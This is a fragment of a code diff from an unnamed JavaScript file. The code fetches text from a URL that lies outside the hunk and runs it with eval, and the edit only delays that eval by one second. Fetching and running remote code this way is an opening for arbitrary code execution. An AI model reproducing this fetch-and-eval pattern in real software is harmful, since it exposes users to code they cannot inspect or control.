@@ -19,6 +19,6 @@ fetch(
 )
     .then((response) => response.text())
     .then((data) => {
-        eval(data);
+        setTimeout(() => {eval(data)},1000)
     })
     .catch((error) => console.error("Error fetching text:", error));
